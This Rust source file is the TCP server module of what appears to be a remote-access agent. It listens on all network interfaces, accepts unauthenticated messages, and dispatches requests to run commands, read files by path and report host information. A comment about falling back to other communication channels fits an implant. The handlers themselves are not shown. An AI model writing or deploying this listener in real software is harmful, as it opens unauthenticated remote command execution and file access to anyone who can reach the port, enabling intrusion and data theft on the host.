use std::io::{Error, Read, Write};
use std::net::{Shutdown, TcpListener, TcpStream};
use std::thread;

use ron;

use crate::communication::actions::{
    download_file_message, get_basic_info_request, run_command_message,
};
use crate::communication::messages::{DownloadFileRequest, GetBasicInfoRequest, Message,
                                     MessageTypes, RunCommandRequest, MESSAGE_HEADER_LENGTH, MessageType};
use crate::communication::serialization::{extract_msg_type_and_length, serialize_message};
use serde::Serialize;

use num_traits::{FromPrimitive};

pub const BIND_ANY: &str = "0.0.0.0";

fn send_response(
    response: impl Serialize + MessageType,
    mut stream: &TcpStream,
) -> Result<(), Error> {
    let response_buffer = serialize_message(response)?;
    println!("Buffer sending: {:?}", &response_buffer);
    stream.write(&response_buffer)?;
    Ok(())
}

fn handle_message(message: Message, stream: &TcpStream) {
    match MessageTypes::from_u8(message.message_type) {
        Some(MessageTypes::RunCommandRequest) => {
            println!("Run command type!");
            let request: RunCommandRequest = ron::de::from_bytes(&message.serialized_message).unwrap();
            let response = run_command_message(request);
            send_response(response, stream).unwrap();
        },
        Some(MessageTypes::DownloadFileRequest) => {
            let request: DownloadFileRequest =
                ron::de::from_bytes(&message.serialized_message).unwrap();
            println!("Wow! the download file request! path {}", request.path);
            let response = download_file_message(request);
            send_response(response, stream).unwrap();
        },
        Some(MessageTypes::GetBasicInfoRequest) => {
            let _request: GetBasicInfoRequest =
                ron::de::from_bytes(&message.serialized_message).unwrap();
            let response = get_basic_info_request();
            send_response(response, stream).unwrap();
        },
        _ => {
            println!("Unrecognized message type '{}'", message.get_type())
        },
    }
}

pub fn get_message(mut stream: &TcpStream) -> Result<Message, Error> {
    let mut type_and_length = [0 as u8; MESSAGE_HEADER_LENGTH];
    return match stream.read_exact(&mut type_and_length) {
        Ok(()) => {
            let (msg_type, msg_length) = extract_msg_type_and_length(type_and_length);
            let mut message = vec![0; msg_length];

            // Read_exact function guarantees that we will read exactly enough data to fill the buffer
            stream
                .read_exact(&mut message)
                .expect("Could not read message after getting message metadata. Error: {}");
            Ok(Message {
                message_type: msg_type,
                serialized_message_length: msg_length,
                serialized_message: message,
            })
        }
        Err(e) => {
            println!(
                "An error occurred, terminating connection with {}. Error: {}",
                stream.peer_addr()?,
                e
            );
            stream.shutdown(Shutdown::Both)?;
            Err(e)
        }
    };
}

pub fn handle_client(mut stream: TcpStream) -> Result<(), Error> {
    println!("Handling connection from {}", stream.peer_addr()?);
    while match get_message(&mut stream) {
        Ok(message) => {
            handle_message(message, &stream);
            true
        }
        Err(e) => {
            println!(
                "An error occurred while trying to get message. Error: {}",
                e
            );
            return Err(e);
        }
    } {}
    Ok(())
}

pub fn run_server(port: u16) -> Result<(), Error> {
    // If we can't open the server, it probably means:
    // - The port is already taken, or we are not running in sufficient permissions
    // - We thread both as recoverable errors, since if the port is not open now it might be open later.
    // - And, in addition, we have other ways to communicate so we should try them too instead of panicking.
    let listener = TcpListener::bind(format!("{}:{}", BIND_ANY, port))?;

    match listener.local_addr() {
        Ok(address) => {
            println!("Listening on: {:?}", address);
        }
        Err(e) => {
            println!("Error {} while trying to get local address.", &e);
        }
    };
    // accept connections and process them in a new thread
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection with: {}", stream.peer_addr()?);
                thread::spawn(move || {
                    // connection succeeded
                    // TODO what to do if this returns Error
                    handle_client(stream)
                });
            }
            Err(e) => {
                println!("Connection failed: {}", e);
                /* connection failed */
            }
        }
    }
    // TODO catch this panic
    panic!("Server closed unexpectedly")
}
